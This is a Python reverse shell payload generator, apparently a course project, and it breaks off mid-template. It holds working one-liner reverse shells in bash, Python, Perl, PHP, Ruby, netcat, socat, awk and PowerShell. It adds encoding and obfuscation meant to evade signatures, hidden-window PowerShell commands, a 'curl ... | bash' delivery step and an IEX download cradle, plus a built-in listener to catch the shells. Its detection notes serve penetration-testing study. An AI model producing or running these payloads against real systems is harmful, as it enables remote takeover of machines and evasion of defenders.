#!/usr/bin/env python3
"""
shellgen.py — Engineer-Grade Reverse Shell Payload Generator
============================================================
Module 01 · Week 1 · Project 5

FOR AUTHORIZED LAB / CTF / PENETRATION TESTING ENVIRONMENTS ONLY.

A production-grade shell payload system built around a typed template
database, a multi-mode encoding engine, an OPSEC analyser with MITRE
ATT&CK mapping, and a deployment planner — not just a list of copy-paste
one-liners.

FEATURES
  TEMPLATE DATABASE       25+ reverse shell templates across 12+ languages
  ENCODING ENGINE         plain · b64 · url · ps_enc (PowerShell -EncodedCommand)
  OBFUSCATION             Variable renaming + string-split for bash/python
  OPSEC ANALYSIS          Stealth score (1–10) + Sigma/Suricata/YARA detection notes
  MITRE ATT&CK MAPPING    Technique IDs per template (T1059.x, T1572, T1071.x …)
  DEPLOYMENT PLANNER      Listener + HTTP host + delivery + PTY upgrade, step by step
  BUILT-IN TCP LISTENER   --listen PORT without nc required (threaded I/O)
  FILTERING               By platform, language, minimum stealth score, tags
  OUTPUT FORMATS          Table · single+OPSEC · cheat sheet · JSON

USAGE
  python3 shellgen.py --list
  python3 shellgen.py --lhost 192.168.100.10 --lport 4444 --name bash-tcp
  python3 shellgen.py --lhost 192.168.100.10 --lport 4444 --name python3-socket --encode b64
  python3 shellgen.py --lhost 192.168.100.10 --lport 4444 --name bash-tcp --obfuscate
  python3 shellgen.py --lhost 192.168.100.10 --lport 4444 --name bash-fifo --plan
  python3 shellgen.py --lhost 192.168.100.10 --lport 4444 --cheatsheet
  python3 shellgen.py --lhost 192.168.100.10 --lport 4444 --platform linux --min-stealth 6
  python3 shellgen.py --listen 4444
  python3 shellgen.py --lhost 192.168.100.10 --lport 4444 --name ps-socket --encode ps_enc
  python3 shellgen.py --lhost 192.168.100.10 --lport 4444 --tag ssl --format json

Author : Kuldeep Singh
Lab    : 192.168.100.0/24 | Kali .10 | Target .30
"""

from __future__ import annotations

import argparse
import base64
import hashlib
import json
import os
import random
import select
import socket
import string
import sys
import threading
import time
import urllib.parse
from dataclasses import dataclass
from typing import ClassVar, Dict, List, Optional, Tuple


# ─────────────────────────────────────────────────────────────────────────────
# ANSI colour helpers
# ─────────────────────────────────────────────────────────────────────────────

class C:
    """Centralised ANSI escape codes. All output passes through here."""
    RST  = "\033[0m"
    BOLD = "\033[1m"
    DIM  = "\033[2m"
    RED  = "\033[91m"
    GRN  = "\033[92m"
    YEL  = "\033[93m"
    BLU  = "\033[94m"
    MAG  = "\033[95m"
    CYN  = "\033[96m"
    WHT  = "\033[97m"
    GRAY = "\033[90m"

    _ANSI_RE: ClassVar[object] = None

    @classmethod
    def strip(cls, text: str) -> str:
        import re
        if cls._ANSI_RE is None:
            cls._ANSI_RE = re.compile(r"\033\[[0-9;]*m")
        return cls._ANSI_RE.sub("", text)

    @classmethod
    def width(cls, text: str) -> int:
        return len(cls.strip(text))


def stealth_bar(score: int, width: int = 10) -> str:
    """Render a colour-coded block progress bar for stealth score 1–10."""
    filled = round(score * width / 10)
    bar    = "█" * filled + "░" * (width - filled)
    colour = C.RED if score <= 3 else (C.YEL if score <= 6 else C.GRN)
    return f"{colour}{bar}{C.RST} {C.BOLD}{score}/10{C.RST}"


# ─────────────────────────────────────────────────────────────────────────────
# Core data model
# ─────────────────────────────────────────────────────────────────────────────

@dataclass(frozen=True)
class PayloadTemplate:
    """
    Immutable reverse-shell payload descriptor.

    Frozen so the entire template database is safe to share across threads
    and cannot be mutated after initialisation.  All mutable-looking fields
    (lists) must be passed as tuples to maintain hashability.
    """
    name:        str               # slug used in --name
    lang:        str               # primary interpreter / tool
    platform:    str               # linux · windows · any
    description: str               # one-line description
    template:    str               # raw shell — {LHOST}/{LPORT} placeholders
    stealth:     int               # 1 (trivially detected) … 10 (very stealthy)
    opsec_notes: Tuple[str, ...]   # detection engineering notes
    encodable:   Tuple[str, ...]   # supported EncodingEngine modes
    tags:        Tuple[str, ...]   # filter labels: ssl, pty, no-nc, windows …
    mitre:       Tuple[str, ...]   # ATT&CK technique IDs
    listener:    str = "nc -lvnp {LPORT}"

    def render(self, lhost: str, lport: int) -> str:
        """Substitute {LHOST}/{LPORT} and return a ready-to-run string."""
        return self.template.replace("{LHOST}", lhost).replace("{LPORT}", str(lport))

    def sha256(self, lhost: str, lport: int) -> str:
        """SHA-256 fingerprint of the rendered payload (threat-hunting aid)."""
        return hashlib.sha256(self.render(lhost, lport).encode()).hexdigest()


# ─────────────────────────────────────────────────────────────────────────────
# Encoding engine
# ─────────────────────────────────────────────────────────────────────────────

class EncodingEngine:
    """
    Pure-static encoding transformations.

    Templates advertise which encodings they support via their `encodable`
    tuple.  Never apply an encoding not in that list — e.g. ps_enc wraps
    PowerShell UTF-16LE and is meaningless for a bash one-liner.
    """
    MODES: ClassVar[Tuple[str, ...]] = ("plain", "b64", "url", "ps_enc")

    @staticmethod
    def encode_plain(payload: str) -> str:
        return payload

    @staticmethod
    def encode_b64(payload: str) -> str:
        encoded = base64.b64encode(payload.encode()).decode()
        return f"echo {encoded} | base64 -d | bash"

    @staticmethod
    def encode_url(payload: str) -> str:
        return urllib.parse.quote(payload, safe="")

    @staticmethod
    def encode_ps_enc(payload: str) -> str:
        """PowerShell -EncodedCommand: UTF-16LE then base64."""
        b64 = base64.b64encode(payload.encode("utf-16-le")).decode()
        return f"powershell -NoP -NonI -W Hidden -Enc {b64}"

    @classmethod
    def encode(cls, payload: str, mode: str) -> str:
        dispatch = {
            "plain":  cls.encode_plain,
            "b64":    cls.encode_b64,
            "url":    cls.encode_url,
            "ps_enc": cls.encode_ps_enc,
        }
        if mode not in dispatch:
            raise ValueError(f"Unknown encoding '{mode}'. Choose: {', '.join(cls.MODES)}")
        return dispatch[mode](payload)


# ─────────────────────────────────────────────────────────────────────────────
# Obfuscation engine
# ─────────────────────────────────────────────────────────────────────────────

class ObfuscationEngine:
    """
    Shallow obfuscation — illustrates how static signatures are broken.

    Intentionally NOT full AV evasion.  The aim is to teach the concept
    (break string-match rules) and understand what defenders see.
    Deeper techniques (polymorphic shellcode, AMSI bypass) are Module 3+.
    """

    @staticmethod
    def _rand_var(length: int = 6) -> str:
        return "_" + "".join(random.choices(string.ascii_lowercase, k=length))

    @staticmethod
    def obfuscate_bash(payload: str, lhost: str, lport: int) -> str:
        """
        Strategy:
          1. Assign IP/port to variables — breaks IP-literal detection
          2. Use variable default syntax (${v:-value}) — IP octets never
             appear as a contiguous dotted string in the command line
          3. Rename the shell reference to a temp variable
        """
        v_ip   = ObfuscationEngine._rand_var()
        v_port = ObfuscationEngine._rand_var()
        v_sh   = ObfuscationEngine._rand_var()

        octets   = lhost.split(".")
        if len(octets) == 4:
            a, b, c, d = octets
            o = [ObfuscationEngine._rand_var() for _ in range(4)]
            ip_assign = (
                f"{o[0]}={a}; {o[1]}={b}; {o[2]}={c}; {o[3]}={d}; "
                f"{v_ip}=${{{o[0]}}}.${{{o[1]}}}.${{{o[2]}}}.${{{o[3]}}}; "
            )
        else:
            ip_assign = f"{v_ip}={lhost}; "

        header = ip_assign + f"{v_port}={lport}; {v_sh}=bash; "
        obf = payload.replace(lhost, f"${v_ip}").replace(str(lport), f"${v_port}")
        return header + obf

    @staticmethod
    def obfuscate_python(payload: str, lhost: str, lport: int) -> str:
        """
        Strategy:
          1. Split the IP string into concatenated char sequences
          2. Hex-encode the port literal
          3. These changes break simple string-match YARA rules
        """
        parts = lhost.split(".")
        if len(parts) == 4:
            ip_obf = '".".join([' + ",".join(f'"{p}"' for p in parts) + "])"
            ip_obf = '"' + ".".join(parts[:2]) + '"+"."+' + '"' + ".".join(parts[2:]) + '"'
        else:
            ip_obf = f'"{lhost}"'

        port_hex = hex(lport)
        obf = payload
        obf = obf.replace(f'"{lhost}"', ip_obf)
        obf = obf.replace(f"'{lhost}'", ip_obf)
        obf = obf.replace(str(lport), port_hex)
        return obf


# ─────────────────────────────────────────────────────────────────────────────
# OPSEC analyser
# ─────────────────────────────────────────────────────────────────────────────

class OpsecAnalyzer:
    """
    Contextualises detection risk given the chosen encoding and obfuscation.
    Adjusts the effective stealth score and appends contextual notes.
    """

    @staticmethod
    def effective_stealth(t: PayloadTemplate, encoded: bool, obfuscated: bool) -> int:
        score = t.stealth
        if encoded:
            score = min(10, score + 1)
        if obfuscated:
            score = min(10, score + 1)
        return score

    @staticmethod
    def notes(t: PayloadTemplate, encoded: bool, obfuscated: bool) -> List[str]:
        result = list(t.opsec_notes)
        if encoded:
            result.append(
                "[+] Encoding hides plaintext from shallow string-match rules "
                "(Suricata content, YARA strings, grep-based SIEM alerts)"
            )
        if obfuscated:
            result.append(
                "[+] Obfuscation breaks IP-literal and keyword matching but does NOT "
                "defeat behavioural EDR analysis (process tree, syscall sequence, eBPF)"
            )
        if not encoded and not obfuscated and t.stealth < 4:
            result.append(
                "[!] Low-stealth payload in plain form — trivially detected by any "
                "SIEM with a basic Linux baseline. Consider --encode b64 or --obfuscate"
            )
        return result


# ─────────────────────────────────────────────────────────────────────────────
# Deployment planner
# ─────────────────────────────────────────────────────────────────────────────

class DeploymentPlanner:
    """
    Generates a complete 4-step attack workflow:
      STEP 1 — start the listener
      STEP 2 — save payload and host it via HTTP
      STEP 3 — deliver and execute on target
      STEP 4 — stabilise the shell (PTY upgrade)
    """

    PTY_UPGRADE = (
        "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
        "  →  CTRL+Z  →  stty raw -echo; fg  →  reset"
    )

    @staticmethod
    def generate(t: PayloadTemplate, lhost: str, lport: int, payload: str) -> List[str]:
        listener = t.listener.replace("{LPORT}", str(lport)).replace("{LHOST}", lhost)
        return [
            ("STEP 1 — Start listener on attacker machine (Kali)", listener),
            (
                "STEP 2 — Save payload to /tmp/shell.sh and host via HTTP",
                f"echo '{payload}' > /tmp/shell.sh && chmod +x /tmp/shell.sh\n"
                f"  python3 -m http.server 4445 --directory /tmp",
            ),
            (
                "STEP 3 — Execute on target",
                f"curl http://{lhost}:4445/shell.sh | bash",
            ),
            (
                "STEP 4 — Stabilise shell (PTY upgrade)",
                DeploymentPlanner.PTY_UPGRADE,
            ),
        ]


# ─────────────────────────────────────────────────────────────────────────────
# Built-in TCP listener
# ─────────────────────────────────────────────────────────────────────────────

class TCPListener:
    """
    Minimal reverse-shell catcher — no nc required.

    Architecture:
      • main thread   → reads stdin, sends lines to the remote shell
      • daemon thread → reads socket data, prints to stdout
    A threading.Event lets either side signal shutdown cleanly.
    """

    @classmethod
    def listen(cls, port: int) -> None:
        print(f"\n  {C.CYN}┌──────────────────────────────────────────────────────────────┐")
        print(f"  │  shellgen · built-in TCP listener                            │")
        print(f"  │  Waiting for connection …  CTRL+C to abort                   │")
        print(f"  └──────────────────────────────────────────────────────────────┘{C.RST}\n")

        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            srv.bind(("0.0.0.0", port))
        except PermissionError:
            print(f"  {C.RED}[!] Cannot bind to port {port} — try >1024 or run as root.{C.RST}")
            return
        except OSError as exc:
            print(f"  {C.RED}[!] Bind error: {exc}{C.RST}")
            return

        srv.listen(1)
        print(f"  {C.GRN}[*]{C.RST} Listening on {C.BOLD}0.0.0.0:{port}{C.RST} …\n")

        try:
            conn, addr = srv.accept()
        except KeyboardInterrupt:
            print(f"\n  {C.YEL}[!] Listener cancelled.{C.RST}")
            srv.close()
            return

        print(f"  {C.GRN}[+]{C.RST} Shell from {C.BOLD}{addr[0]}:{addr[1]}{C.RST}\n")
        stop = threading.Event()

        def recv_loop() -> None:
            while not stop.is_set():
                try:
                    ready, _, _ = select.select([conn], [], [], 0.2)
                    if ready:
                        data = conn.recv(4096)
                        if not data:
                            print(f"\n  {C.YEL}[!] Remote closed connection.{C.RST}")
                            stop.set()
                            break
                        sys.stdout.write(data.decode(errors="replace"))
                        sys.stdout.flush()
                except OSError:
                    stop.set()
                    break

        threading.Thread(target=recv_loop, daemon=True).start()

        try:
            while not stop.is_set():
                try:
                    line = input()
                    conn.sendall((line + "\n").encode())
                except EOFError:
                    break
        except KeyboardInterrupt:
            pass

        stop.set()
        conn.close()
        srv.close()
        print(f"\n  {C.YEL}[*]{C.RST} Session closed.")


# ─────────────────────────────────────────────────────────────────────────────
# Template database  — 25 reverse shells across 12 languages
# ─────────────────────────────────────────────────────────────────────────────

def _t(**kw) -> PayloadTemplate:
    """Convenience constructor — converts list fields to tuples."""
    for f in ("opsec_notes", "encodable", "tags", "mitre"):
        if f in kw and isinstance(kw[f], list):
            kw[f] = tuple(kw[f])
    return PayloadTemplate(**kw)


TEMPLATE_DB: Tuple[PayloadTemplate, ...] = (

    # ── BASH ──────────────────────────────────────────────────────────────────
    _t(
        name="bash-tcp",
        lang="bash", platform="linux",
        description="Classic bash /dev/tcp redirect",
        template="bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
        stealth=2,
        opsec_notes=[
            "▸ 'bash -i' is flagged by virtually every EDR; shows as interactive shell in process tree",
            "▸ '/dev/tcp' literal matches hundreds of Suricata, Sigma, and YARA signatures",
            "▸ FD redirects '>& 0>&1' captured by bash audit logging (auditd rule -a always,exit -F arch=b64 -S execve)",
            "▸ No encryption — raw TCP stream fully visible to network IDS",
            "▸ Use ONLY in noisy lab environments or as an absolute last resort",
        ],
        encodable=["b64", "url"],
        tags=["classic", "noisy", "no-nc"],
        mitre=["T1059.004"],
    ),

    _t(
        name="bash-fifo",
        lang="bash", platform="linux",
        description="Named pipe (mkfifo) shell — avoids /dev/tcp literal",
        template=(
            "rm /tmp/f 2>/dev/null; mkfifo /tmp/f; "
            "cat /tmp/f | /bin/sh -i 2>&1 | nc {LHOST} {LPORT} > /tmp/f"
        ),
        stealth=5,
        opsec_notes=[
            "▸ Avoids /dev/tcp — breaks the most common bash shell string-match rules",
            "▸ mkfifo + cat combo flagged by mature auditd / sysdig rule sets",
            "▸ Creates artefact /tmp/f — forensic indicator of compromise",
            "▸ Requires netcat (nc) on target — may not be available",
            "▸ nc connection still visible in network flow logs (Zeek conn.log)",
        ],
        encodable=["b64", "url"],
        tags=["fifo", "no-devtcp"],
        mitre=["T1059.004", "T1059.003"],
        listener="nc -lvnp {LPORT}",
    ),

    _t(
        name="bash-udp",
        lang="bash", platform="linux",
        description="bash /dev/udp — evades TCP-only network signatures",
        template="bash -i >& /dev/udp/{LHOST}/{LPORT} 0>&1",
        stealth=4,
        opsec_notes=[
            "▸ UDP transport evades TCP-specific Suricata and Snort detection rules",
            "▸ 'bash -i' still appears in process tree — host-based EDR catches this",
            "▸ UDP is stateless — shell interaction unreliable on lossy networks",
            "▸ Requires UDP listener: nc -ulvnp {LPORT}",
        ],
        encodable=["b64"],
        tags=["udp", "no-nc"],
        mitre=["T1059.004"],
        listener="nc -ulvnp {LPORT}",
    ),

    _t(
        name="sh-tcp",
        lang="sh", platform="linux",
        description="/bin/sh via /dev/tcp using FD 196 trick",
        template=(
            "0<&196; exec 196<>/dev/tcp/{LHOST}/{LPORT}; "
            "sh <&196 >&196 2>&196"
        ),
        stealth=3,
        opsec_notes=[
            "▸ Uses /bin/sh — marginally less suspicious than bash in some EDR policies",
            "▸ FD 196 trick slightly obscures the redirect; auditd still logs FD operations",
            "▸ /dev/tcp literal present — same signature hits as bash-tcp",
        ],
        encodable=["b64", "url"],
        tags=["sh", "posix", "no-nc"],
        mitre=["T1059.004"],
    ),

    # ── PYTHON ────────────────────────────────────────────────────────────────
    _t(
        name="python3-socket",
        lang="python3", platform="any",
        description="Python3 socket reverse shell with subprocess",
        template=(
            "python3 -c \""
            "import socket,subprocess,os;"
            "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            "s.connect(('{LHOST}',{LPORT}));"
            "os.dup2(s.fileno(),0);"
            "os.dup2(s.fileno(),1);"
            "os.dup2(s.fileno(),2);"
            "p=subprocess.call(['/bin/sh','-i']);\""
        ),
        stealth=5,
        opsec_notes=[
            "▸ python3 -c one-liner is a high-confidence SIEM baseline indicator",
            "▸ socket.connect() visible in strace and eBPF-based EDR (Falco, Tetragon)",
            "▸ os.dup2() FD redirection is a known evasion pattern; flagged by Falco rules",
            "▸ Works on any system with Python3 — extremely common on Linux servers",
            "▸ Unencrypted TCP — network IDS can reconstruct the full shell conversation",
        ],
        encodable=["b64", "url"],
        tags=["python3", "no-nc", "cross-platform"],
        mitre=["T1059.006"],
    ),

    _t(
        name="python3-pty",
        lang="python3", platform="linux",
        description="Python3 with pty.spawn — fully interactive PTY shell",
        template=(
            "python3 -c \""
            "import pty,socket,os;"
            "s=socket.socket();"
            "s.connect(('{LHOST}',{LPORT}));"
            "[os.dup2(s.fileno(),f) for f in (0,1,2)];"
            "pty.spawn('/bin/bash');\""
        ),
        stealth=5,
        opsec_notes=[
            "▸ pty.spawn provides a full interactive PTY — sudo, SSH, vim all work",
            "▸ pty allocation syscalls (openpty, setsid) are more detectable than raw socket",
            "▸ pty.spawn is a named malicious pattern in Falco's default ruleset",
            "▸ Requires Python3 pty module — part of standard library, always present",
        ],
        encodable=["b64"],
        tags=["python3", "pty", "interactive", "no-nc"],
        mitre=["T1059.006"],
    ),

    _t(
        name="python2-socket",
        lang="python2", platform="any",
        description="Python2 socket reverse shell (legacy targets)",
        template=(
            "python -c \""
            "import socket,subprocess,os;"
            "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            "s.connect(('{LHOST}',{LPORT}));"
            "os.dup2(s.fileno(),0);"
            "os.dup2(s.fileno(),1);"
            "os.dup2(s.fileno(),2);"
            "p=subprocess.call(['/bin/sh','-i']);\""
        ),
        stealth=5,
        opsec_notes=[
            "▸ Python2 is EOL but still present on CentOS 6/7, older Debian/RHEL",
            "▸ Same detection profile as python3-socket",
            "▸ 'python ' (without 3) is flagged as unusual on hardened modern systems",
        ],
        encodable=["b64", "url"],
        tags=["python2", "legacy", "no-nc"],
        mitre=["T1059.006"],
    ),

    # ── PERL ──────────────────────────────────────────────────────────────────
    _t(
        name="perl-socket",
        lang="perl", platform="linux",
        description="Perl Socket module reverse shell — common on legacy web servers",
        template=(
            "perl -e 'use Socket;"
            "$i=\"{LHOST}\";"
            "$p={LPORT};"
            "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
            "connect(S,sockaddr_in($p,inet_aton($i)));"
            "open(STDIN,\">&S\");"
            "open(STDOUT,\">&S\");"
            "open(STDERR,\">&S\");"
            "exec(\"/bin/sh -i\");'"
        ),
        stealth=6,
        opsec_notes=[
            "▸ Perl is less monitored than bash/python3 on many SIEM deployments",
            "▸ 'perl -e' one-liner still flagged by Sigma rule 'Suspicious Perl Execution'",
            "▸ socket() + connect() syscall sequence visible to eBPF tracers",
            "▸ Often present on older web servers: cPanel, legacy PHP stacks",
        ],
        encodable=["b64", "url"],
        tags=["perl", "legacy"],
        mitre=["T1059.006"],
    ),

    _t(
        name="perl-fork",
        lang="perl", platform="linux",
        description="Perl IO::Socket with fork-to-background",
        template=(
            "perl -MIO -e '$p=fork;exit,if($p);"
            "$c=new IO::Socket::INET(PeerAddr,\"{LHOST}:{LPORT}\");"
            "STDIN->fdopen($c,r);"
            "$~->fdopen($c,w);"
            "system$_ while<>;'"
        ),
        stealth=6,
        opsec_notes=[
            "▸ fork() to background creates a double-fork indicator in the process table",
            "▸ IO::Socket::INET is part of core Perl — no extra dependencies needed",
            "▸ IO module usage flagged by some hardened Perl audit configurations",
        ],
        encodable=["b64"],
        tags=["perl", "no-nc", "fork"],
        mitre=["T1059.006"],
    ),

    # ── PHP ───────────────────────────────────────────────────────────────────
    _t(
        name="php-exec",
        lang="php", platform="linux",
        description="PHP fsockopen + exec() — classic web shell entry point",
        template=(
            "php -r '$sock=fsockopen(\"{LHOST}\",{LPORT});"
            "exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        ),
        stealth=4,
        opsec_notes=[
            "▸ fsockopen + exec combo is in top-10 PHP malware signatures (ClamAV, YARA)",
            "▸ PHP -r one-liner flagged by WAF/RASP tools (mod_security CRS ruleset)",
            "▸ File descriptor 3 is a known indicator — many SIEMs have specific rules for it",
            "▸ Useful in web shell scenarios where PHP execution is already established",
        ],
        encodable=["b64", "url"],
        tags=["php", "web", "webshell"],
        mitre=["T1059.006", "T1505.003"],
    ),

    _t(
        name="php-proc-open",
        lang="php", platform="linux",
        description="PHP proc_open() — full I/O pipe control",
        template=(
            "php -r '$d=array(0=>array(\"socket\"),1=>array(\"socket\"),2=>array(\"socket\"));"
            "$s=fsockopen(\"{LHOST}\",{LPORT});"
            "$pr=proc_open(\"/bin/bash\",$d,$p);"
            "while(!feof($s)){$d=fread($s,1024);fwrite($p[0],$d);}'"
        ),
        stealth=4,
        opsec_notes=[
            "▸ proc_open() flagged by PHP Hardening modules and Snuffleupagus extension",
            "▸ proc_open + socket combo matches ClamAV PHP.ShellExec signatures",
            "▸ More reliable than exec() for interactive sessions",
        ],
        encodable=["b64"],
        tags=["php", "web", "proc_open"],
        mitre=["T1059.006", "T1505.003"],
    ),

    # ── RUBY ──────────────────────────────────────────────────────────────────
    _t(
        name="ruby-socket",
        lang="ruby", platform="any",
        description="Ruby TCPSocket with fork — cross-platform",
        template=(
            "ruby -rsocket -e 'exit if fork;"
            "c=TCPSocket.new(\"{LHOST}\",\"{LPORT}\");"
            "while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
        ),
        stealth=6,
        opsec_notes=[
            "▸ Ruby is uncommon on servers — unusual process may draw analyst attention",
            "▸ exit if fork is a classic daemonisation indicator",
            "▸ -rsocket flag visible in /proc/$PID/cmdline — process auditing catches it",
            "▸ Common on Rails / Jekyll / Sinatra server deployments",
        ],
        encodable=["b64"],
        tags=["ruby", "fork", "cross-platform"],
        mitre=["T1059.006"],
    ),

    # ── NETCAT ────────────────────────────────────────────────────────────────
    _t(
        name="nc-e",
        lang="netcat", platform="linux",
        description="netcat with -e flag (traditional nc only)",
        template="nc -e /bin/sh {LHOST} {LPORT}",
        stealth=2,
        opsec_notes=[
            "▸ nc -e is disabled in OpenBSD netcat (default on Debian/Ubuntu)",
            "▸ 'nc -e' appears in virtually every SIEM rule set as a high-confidence hit",
            "▸ Spawning /bin/sh logged by all process auditing frameworks",
            "▸ Raw TCP — full visibility to network sensors",
        ],
        encodable=["url"],
        tags=["netcat", "classic", "noisy"],
        mitre=["T1059.004"],
    ),

    _t(
        name="nc-mkfifo",
        lang="netcat", platform="linux",
        description="netcat without -e using mkfifo (OpenBSD nc compatible)",
        template=(
            "rm /tmp/.s 2>/dev/null; mkfifo /tmp/.s; "
            "/bin/sh -i < /tmp/.s 2>&1 | nc {LHOST} {LPORT} > /tmp/.s; "
            "rm /tmp/.s"
        ),
        stealth=5,
        opsec_notes=[
            "▸ Works with OpenBSD netcat — no -e flag required",
            "▸ Hidden-ish filename /tmp/.s — slightly less obvious than /tmp/f",
            "▸ mkfifo + nc pipe is a well-known pattern; auditd syscall rules catch it",
            "▸ Process tree shows nc + sh as siblings — visible in ps / top",
        ],
        encodable=["url"],
        tags=["netcat", "no-e", "fifo"],
        mitre=["T1059.004"],
    ),

    _t(
        name="ncat-ssl",
        lang="netcat", platform="linux",
        description="ncat --ssl — encrypted shell, evades network IDS",
        template="ncat --ssl {LHOST} {LPORT} -e /bin/bash",
        stealth=7,
        opsec_notes=[
            "▸ TLS encryption defeats network-layer Suricata/Snort signature matching",
            "▸ Requires ncat (Nmap suite) on target — not always present",
            "▸ Self-signed cert to unusual port may trigger DPI anomaly detection",
            "▸ Host-based EDR still sees: process tree, ncat --ssl cmdline arg",
        ],
        encodable=["url"],
        tags=["netcat", "ssl", "encrypted"],
        mitre=["T1059.004", "T1572"],
        listener="ncat --ssl -lvnp {LPORT}",
    ),

    # ── SOCAT ─────────────────────────────────────────────────────────────────
    _t(
        name="socat-tcp",
        lang="socat", platform="linux",
        description="socat TCP reverse shell with full PTY",
        template=(
            "socat TCP:{LHOST}:{LPORT} "
            "EXEC:'bash -li',pty,stderr,setsid,sigint,sane"
        ),
        stealth=6,
        opsec_notes=[
            "▸ socat not installed by default — its presence is suspicious in itself",
            "▸ pty,setsid allocate a TTY session — visible via who/w/last commands",
            "▸ Provides fully interactive TTY without PTY upgrade step (best lab shell)",
            "▸ Outbound socat TCP visible in network flow analysis (Zeek, NetFlow)",
        ],
        encodable=["url"],
        tags=["socat", "pty", "interactive"],
        mitre=["T1059.004"],
        listener="socat FILE:`tty`,raw,echo=0 TCP-LISTEN:{LPORT}",
    ),

    _t(
        name="socat-ssl",
        lang="socat", platform="linux",
        description="socat OPENSSL PTY — best stealth + interactivity combo",
        template=(
            "socat OPENSSL:{LHOST}:{LPORT},verify=0 "
            "EXEC:'bash -li',pty,stderr,setsid,sigint,sane"
        ),
        stealth=8,
        opsec_notes=[
            "▸ TLS conceals all traffic from network IDS — content matching impossible",
            "▸ verify=0 (self-signed) — anomalous TLS metadata may trigger DPI alert",
            "▸ Full interactive PTY in one step — best shell quality available",
            "▸ Host-based EDR still sees: socat process + OPENSSL keyword in cmdline",
            "▸ Requires socat compiled with OpenSSL support",
        ],
        encodable=["url"],
        tags=["socat", "ssl", "encrypted", "pty", "interactive"],
        mitre=["T1059.004", "T1572"],
        listener=(
            "openssl req -x509 -newkey rsa:4096 -keyout /tmp/key.pem "
            "-out /tmp/cert.pem -days 1 -nodes -subj '/CN=srv' 2>/dev/null; "
            "socat OPENSSL-LISTEN:{LPORT},cert=/tmp/cert.pem,"
            "key=/tmp/key.pem,verify=0 FILE:`tty`,raw,echo=0"
        ),
    ),

    # ── AWK ───────────────────────────────────────────────────────────────────
    _t(
        name="awk-shell",
        lang="awk", platform="linux",
        description="gawk /inet/tcp — no bash, nc, or python needed",
        template=(
            "awk 'BEGIN {"
            "s = \"/inet/tcp/0/{LHOST}/{LPORT}\";"
            "while(42) {"
            "do { printf \"\" |& s; s |& getline c; } while(c!=\"exit\") <&-;"
            "while ((s |& getline) > 0) print $0 |& s;"
            "close(s);"
            "}}'"
        ),
        stealth=7,
        opsec_notes=[
            "▸ No bash, nc, or python — often overlooked in lockdown / hardened policies",
            "▸ gawk /inet/tcp is a GNU extension — not available in mawk (Ubuntu default)",
            "▸ awk initiating a network connection is a very unusual behavioural pattern",
            "▸ Few SIEM rule sets specifically target awk network activity (as of 2025)",
            "▸ Limited interactivity — command execution works; full PTY does not",
        ],
        encodable=["url"],
        tags=["awk", "no-nc", "no-python", "no-bash", "living-off-the-land"],
        mitre=["T1059.004"],
    ),

    # ── POWERSHELL ────────────────────────────────────────────────────────────
    _t(
        name="ps-socket",
        lang="powershell", platform="windows",
        description="PowerShell TCPClient reverse shell with iex prompt",
        template=(
            "$client = New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT});"
            "$stream = $client.GetStream();"
            "[byte[]]$bytes = 0..65535|%{0};"
            "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){"
            "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
            "$sendback = (iex $data 2>&1 | Out-String );"
            "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
            "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
            "$stream.Write($sendbyte,0,$sendbyte.Length);"
            "$stream.Flush()};"
            "$client.Close()"
        ),
        stealth=5,
        opsec_notes=[
            "▸ TCPClient + iex (Invoke-Expression) is a top-priority Windows Defender detection",
            "▸ iex is flagged by AMSI (Antimalware Scan Interface) — may be blocked pre-execution",
            "▸ PowerShell ScriptBlock Logging captures the full command at runtime (Event 4104)",
            "▸ Use --encode ps_enc to wrap in EncodedCommand and bypass simple cmdline logging",
            "▸ ps_enc alone does NOT bypass AMSI — combine with additional techniques",
        ],
        encodable=["ps_enc"],
        tags=["powershell", "windows", "no-nc"],
        mitre=["T1059.001"],
    ),

    _t(
        name="ps-invoke",
        lang="powershell", platform="windows",
        description="PowerShell IEX download cradle — delivery via HTTP",
        template=(
            "IEX(New-Object Net.WebClient).downloadString('http://{LHOST}:{LPORT}/shell.ps1')"
        ),
        stealth=4,
        opsec_notes=[
            "▸ IEX download cradle is the most-detected PowerShell pattern in the wild",
            "▸ Net.WebClient HTTP download flagged by Windows Defender, AMSI, and most EDR",
            "▸ Requires HTTP server on attacker side serving shell.ps1",
            "▸ Simple and effective in undefended lab environments",
            "▸ In production environments: use HTTPS + ps_enc + AMSI bypass for any chance",
        ],
        encodable=["ps_enc"],
        tags=["powershell", "windows", "download-cradle", "http"],
        mitre=["T1059.001", "T1071.001"],
        listener="python3 -m http.server {LPORT} --directory /tmp",
    ),

    _t(
        name="ps-hidden",
        lang="powershell", platform="windows",
        description="PowerShell hidden window TCP shell via cmd subprocess",
        template=(
            "powershell -NoP -NonI -NoExit -W Hidden -c "
            "\"$c=New-Object Net.Sockets.TcpClient('{LHOST}',{LPORT});"
            "$s=$c.GetStream();"
            "[byte[]]$b=0..65535|%{0};"
            "while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
            "$t=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
            "$r=(iex $t 2>&1|Out-String);"
            "$rb=([Text.Encoding]::ASCII).GetBytes($r+\"`n\");"
            "$s.Write($rb,0,$rb.Length)}\""
        ),
        stealth=5,
        opsec_notes=[
            "▸ -NoExit -NonI -W Hidden reduce Task Manager / PowerShell window visibility",
            "▸ Still captured by PowerShell Module Logging and ScriptBlock Logging (Event 4104)",
            "▸ Combine with ps_enc for an obfuscated command line (won't stop AMSI)",
        ],
        encodable=["ps_enc"],
        tags=["powershell", "windows", "hidden"],
        mitre=["T1059.001"],
    ),

    # ── JAVA ──────────────────────────────────────────────────────────────────
    _t(
        name="java-runtime",
        lang="java", platform="linux",
        description="Java Runtime.exec() — used in RCE chain exploitation",
        template=(
